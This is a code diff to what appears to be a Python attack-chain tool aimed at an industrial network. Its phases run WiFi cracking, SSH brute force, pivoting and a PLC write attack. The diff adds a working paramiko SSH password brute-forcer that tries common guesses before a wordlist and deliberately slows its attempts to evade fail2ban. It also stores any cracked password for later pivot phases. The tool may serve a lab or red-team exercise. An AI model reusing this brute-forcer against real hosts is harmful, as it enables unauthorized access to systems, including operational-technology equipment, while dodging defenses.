@@ -51,6 +51,7 @@ from rich.table import Table
 from rich.rule import Rule
 from rich.prompt import Confirm, Prompt
 from rich.progress import Progress
+from rich.live import Live
 from rich.markup import escape
 from rich.text import Text
 import paramiko
@@ -224,15 +225,6 @@ def _nmap_filter(line: str) -> str:
     return f"[dim]{escape(line)}[/dim]"
 
 
-def _hydra_filter(line: str) -> str:
-    lo = line.lower()
-    if "login:" in lo and "password:" in lo:
-        return f"[bold green blink]{escape(line)}[/bold green blink]"
-    if "error" in lo or "failed" in lo:
-        return f"[dim red]{escape(line)}[/dim red]"
-    if "attempt" in lo:
-        return f"[dim]{escape(line)}[/dim]"
-    return f"[dim]{escape(line)}[/dim]"
 
 
 def ssh_connect(hostname: str, username: str, password: str, port: int = 22) -> paramiko.SSHClient:
@@ -269,7 +261,7 @@ def confirm_phase(title: str) -> bool:
 
 def preflight_check():
     """Verify required system tools are installed before running any phase."""
-    tools = ["nmap", "hydra", "aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng"]
+    tools = ["nmap", "aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng"]
     missing = []
     for tool in tools:
         rc, _ = run_cmd(f"which {tool}", capture=False)
@@ -277,7 +269,7 @@ def preflight_check():
             missing.append(tool)
     if missing:
         err(f"Missing tools: {', '.join(missing)}")
-        err("Install with: sudo apt-get install -y nmap hydra aircrack-ng")
+        err("Install with: sudo apt-get install -y nmap aircrack-ng")
         sys.exit(1)
     ok(f"Preflight OK — all tools found: {', '.join(tools)}")
 
@@ -363,43 +355,122 @@ def phase2_idmz_recon() -> PhaseResult:
     return r
 
 
-def phase3_hydra_brute() -> PhaseResult:
-    phase_header(3, "SSH Brute Force on Historian (Hydra)")
-    r = PhaseResult("Hydra SSH Brute Force")
+def _ssh_bruteforce(
+    ip: str,
+    port: int,
+    username: str,
+    wordlist_path: str,
+    delay: float = 0.2,
+) -> str | None:
+    """
+    Sequential paramiko SSH brute forcer.
+    - Strict top-to-bottom order, zero out-of-order attempts
+    - Each password tried exactly once — no re-queuing, no retries on auth fail
+    - Stops and returns the password the instant SSH accepts it
+    - delay: seconds to pause between attempts (avoids triggering fail2ban)
+    """
+    # Quick-check common variations before opening the wordlist
+    priority = ["", username, username[::-1], f"{username}123", "password", "admin123"]
+
+    try:
+        with open(wordlist_path, errors="ignore") as f:
+            wordlist = [line.strip() for line in f if line.strip()]
+    except FileNotFoundError:
+        err(f"Wordlist not found: {wordlist_path}")
+        return None
+
+    candidates = priority + wordlist
+    total      = len(candidates)
+    seen: set[str] = set()
+
+    status_line = Text()
+
+    with Live(status_line, console=console, refresh_per_second=8) as live:
+        for idx, pw in enumerate(candidates, 1):
+            if pw in seen:
+                continue
+            seen.add(pw)
+
+            status_line = Text.assemble(
+                ("  Attempting ", "dim"),
+                (f"[{idx}/{total}]", "bold cyan"),
+                ("  ", ""),
+                (f"{username}", "yellow"),
+                (":", "dim"),
+                (pw, "white"),
+            )
+            live.update(status_line)
+
+            try:
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(
+                    hostname=ip,
+                    port=port,
+                    username=username,
+                    password=pw,
+                    timeout=6,
+                    allow_agent=False,    # don't try SSH agent keys
+                    look_for_keys=False,  # don't try ~/.ssh/id_rsa etc.
+                    banner_timeout=8,
+                )
+                client.close()
+                live.update(Text.assemble(
+                    (" [+] ", "bold green"),
+                    ("HIT — ", "green"),
+                    (f"{username}:{pw}", "bold white"),
+                    (f"  (attempt #{idx})", "dim"),
+                ))
+                return pw
+
+            except paramiko.AuthenticationException:
+                # Clean auth rejection — do NOT retry, just move on
+                time.sleep(delay)
+
+            except paramiko.ssh_exception.NoValidConnectionsError:
+                live.update(Text.assemble(
+                    (" [!] ", "bold yellow"),
+                    (f"SSH unreachable at {ip}:{port} — check connectivity", "yellow"),
+                ))
+                time.sleep(2)
+
+            except Exception as e:
+                # Transient error (banner timeout, reset) — log and skip, do NOT retry
+                live.update(Text.assemble(
+                    (" [!] ", "bold yellow"),
+                    (f"Skipping attempt {idx} ({type(e).__name__}): {e}", "dim yellow"),
+                ))
+                time.sleep(1)
+
+    return None
+
+
+def phase3_ssh_bruteforce() -> PhaseResult:
+    phase_header(3, "SSH Brute Force on Historian (paramiko)")
+    r = PhaseResult("SSH Brute Force")
 
     ip   = CFG["historian"]["ip"]
+    port = CFG["historian"]["port"]
     user = CFG["historian"]["username"]
     wl   = CFG["hydra"]["wordlist"]
-    t    = CFG["hydra"]["threads"]
 
-    # -e nsr   try empty password, username-as-password, reversed username FIRST
-    #          (finds admin/admin or admin/nimda before touching rockyou.txt)
-    # -f       stop immediately on first valid credential
-    # -t 6     6 parallel SSH threads (sweet spot — avoids SSH rate limits)
-    # -V       verbose: print each attempt so we see live progress
-    hydra_cmd = f"hydra -l {user} -e nsr -P {wl} -t 6 -f -V {ip} ssh"
+    info(f"Target: {user}@{ip}:{port}")
+    info("Order: empty → username → reversed → common → wordlist (top to bottom, no repeats)")
 
-    info(f"Trying quick credential variations first (-e nsr), then wordlist")
-    info(f"Will stop the moment a hit is found (-f)")
+    found_pw = _ssh_bruteforce(ip=ip, port=port, username=user, wordlist_path=wl)
 
-    rc, out = stream_cmd(
-        hydra_cmd,
-        timeout=300,
-        line_filter=_hydra_filter,
-        stop_sentinel="[32][ssh]",   # hydra success line prefix
-    )
-
-    cred_lines = [l for l in out.splitlines() if "login:" in l and "password:" in l]
-    if cred_lines:
-        r.finding = cred_lines[0]
+    if found_pw is not None:
         r.status  = "success"
-        ok(f"Credentials found: {r.finding}")
+        r.finding = f"Credentials confirmed: {user}:{found_pw}"
+        ok(r.finding)
+        # Write discovered password back to CFG so later phases use it
+        CFG["historian"]["password"] = found_pw
     else:
         r.status  = "failed"
-        r.finding = "No credentials found with given wordlist"
+        r.finding = f"No valid password found for {user}@{ip}"
         err(r.finding)
 
-    r.output = out[-1000:]
+    r.output = r.finding
     return r
 
 
@@ -611,7 +682,7 @@ def print_report():
 PHASES = [
     (1, "WiFi AP Crack",         phase1_wifi_crack),
     (2, "IDMZ Recon",            phase2_idmz_recon),
-    (3, "SSH Brute Force",       phase3_hydra_brute),
+    (3, "SSH Brute Force",       phase3_ssh_bruteforce),
     (4, "SSH Pivot / OT Recon",  phase4_ssh_pivot),
     (5, "PLC CIP Write Attack",  phase5_plc_attack),
     (6, "Defense Validation",    phase6_defense_check),
